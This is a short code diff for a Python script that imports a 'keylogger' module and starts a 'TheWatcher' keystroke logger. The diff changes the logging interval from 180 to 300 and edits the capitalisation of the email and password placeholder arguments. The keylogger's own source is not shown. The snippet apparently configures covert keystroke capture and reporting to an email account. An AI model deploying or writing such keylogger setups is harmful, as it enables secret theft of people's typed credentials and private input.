@@ -1,4 +1,4 @@
 import keylogger
 
-keylog = keylogger.TheWatcher(180, "ENTER EMAIL", "ENTER PASSWORD")
+keylog = keylogger.TheWatcher(300, "Enter Email", "Enter password")
 keylog.startWatcher() 
